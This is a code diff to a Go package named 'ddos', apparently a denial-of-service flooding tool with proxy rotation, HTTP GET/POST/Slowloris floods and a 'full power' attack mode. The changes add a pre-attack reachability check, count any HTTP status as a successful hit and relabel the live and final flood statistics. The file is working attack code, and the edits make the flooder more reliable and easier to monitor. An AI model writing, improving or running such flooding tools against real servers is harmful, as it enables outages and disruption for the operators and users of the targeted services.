@@ -2,8 +2,10 @@ package ddos
 
 import (
 	"bufio"
+	"context"
 	"crypto/tls"
 	"fmt"
+	"io"
 	"math/rand"
 	"net"
 	"net/http"
@@ -229,6 +231,34 @@ func applyLocalProxyPolicy(target string, useProxies *bool) {
 		fmt.Printf("%s[i] Proxy rotation disabled: loopback/private targets cannot be reached through external proxies.%s\n", Yellow, Reset)
 		*useProxies = false
 	}
+}
+
+func configUsesHTTPFlood(method string) bool {
+	switch method {
+	case "GET", "POST", "HEAD", "MIXED", "FULL", "SLOWLORIS":
+		return true
+	default:
+		return false
+	}
+}
+
+// warnIfHTTPTargetUnreachable does a single short GET — connection refused / timeout means no listener (not proxy-related).
+func warnIfHTTPTargetUnreachable(config AttackConfig) {
+	client := createHTTPClient(config)
+	ctx, cancel := context.WithTimeout(context.Background(), 4*time.Second)
+	defer cancel()
+	req, err := http.NewRequestWithContext(ctx, "GET", config.Target, nil)
+	if err != nil {
+		return
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Printf("%s[!] Pre-check: could not reach %s (%v).%s\n", Yellow, config.Target, err, Reset)
+		fmt.Printf("%s    HTTP flood needs a listener on that host:port (e.g. python -m http.server); otherwise counts stay on \"No response\".%s\n", Yellow, Reset)
+		return
+	}
+	_, _ = io.Copy(io.Discard, resp.Body)
+	resp.Body.Close()
 }
 
 func DoSMenu() {
@@ -482,6 +512,10 @@ func launchAttack(config AttackConfig, monitor *ResourceMonitor) {
 	}
 	fmt.Printf("\n%s[*] Press Ctrl+C to stop the attack%s\n\n", Red, Reset)
 
+	if configUsesHTTPFlood(config.Method) {
+		warnIfHTTPTargetUnreachable(config)
+	}
+
 	go displayLiveStats(startTime)
 
 	go monitorResources(monitor)
@@ -544,6 +578,7 @@ func httpFloodOnce(config AttackConfig, client *http.Client, method string) {
 	req, err := createHTTPRequest(config, method)
 	if err != nil {
 		atomic.AddUint64(&failedHits, 1)
+		atomic.AddUint64(&totalRequests, 1)
 		return
 	}
 
@@ -554,13 +589,14 @@ func httpFloodOnce(config AttackConfig, client *http.Client, method string) {
 		return
 	}
 
-	resp.Body.Close()
-
-	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
+	// Any HTTP status means the server answered; 4xx/5xx used to be counted as "failed" and looked like a broken attack.
+	if resp.StatusCode >= 100 && resp.StatusCode < 600 {
 		atomic.AddUint64(&successfulHits, 1)
 	} else {
 		atomic.AddUint64(&failedHits, 1)
 	}
+	_, _ = io.Copy(io.Discard, resp.Body)
+	resp.Body.Close()
 
 	bytesSize := uint64(800)
 	if method == "POST" {
@@ -830,7 +866,7 @@ func displayLiveStats(startTime time.Time) {
 
 		rps := float64(requests) / elapsed.Seconds()
 
-		fmt.Printf("\r%s[LIVE] Time: %s | Requests: %d | RPS: %.0f | Success: %s%d%s | Failed: %s%d%s",
+		fmt.Printf("\r%s[LIVE] Time: %s | Requests: %d | RPS: %.0f | HTTP replies: %s%d%s | No response: %s%d%s",
 			Yellow, formatDuration(elapsed), requests, rps,
 			Green, successful, Yellow,
 			Red, failed, Reset)
@@ -853,13 +889,13 @@ func displayFinalStats(startTime time.Time) {
 	fmt.Printf("%s  Total Duration:       %s%s\n", Blue, formatDuration(elapsed), Reset)
 	fmt.Printf("%s  Total Requests:       %d%s\n", Blue, requests, Reset)
 	fmt.Printf("%s  Requests Per Second:  %.2f%s\n", Blue, float64(requests)/elapsed.Seconds(), Reset)
-	fmt.Printf("%s  Successful Hits:      %s%d%s\n", Blue, Green, successful, Reset)
-	fmt.Printf("%s  Failed Hits:          %s%d%s\n", Blue, Red, failed, Reset)
-	successRate := 0.0
+	fmt.Printf("%s  HTTP replies (any status): %s%d%s\n", Blue, Green, successful, Reset)
+	fmt.Printf("%s  No response / errors:      %s%d%s\n", Blue, Red, failed, Reset)
+	replyRate := 0.0
 	if requests > 0 {
-		successRate = float64(successful) / float64(requests) * 100
+		replyRate = float64(successful) / float64(requests) * 100
 	}
-	fmt.Printf("%s  Success Rate:         %.2f%%%s\n", Blue, successRate, Reset)
+	fmt.Printf("%s  Reply rate:               %.2f%%%s\n", Blue, replyRate, Reset)
 	fmt.Printf("%s  Total Data Sent:      %.2f GB%s\n", Blue, float64(bytes)/(1024*1024*1024), Reset)
 	fmt.Printf("%s  Total Throughput:     %s%.4f TBPS%s\n\n", Blue, Green, tbps, Reset)
 }
@@ -1076,6 +1112,8 @@ func launchFullPowerAttack(config AttackConfig, monitor *ResourceMonitor) {
 		fmt.Printf("%s[*] Duration: Unlimited (Press Ctrl+C to stop)%s\n", Yellow, Reset)
 	}
 	fmt.Printf("\n%s[⚡] ATTACK IN PROGRESS - SYSTEM UNDER LOAD%s\n\n", Red, Reset)
+
+	warnIfHTTPTargetUnreachable(config)
 
 	go displayLiveStats(startTime)
 
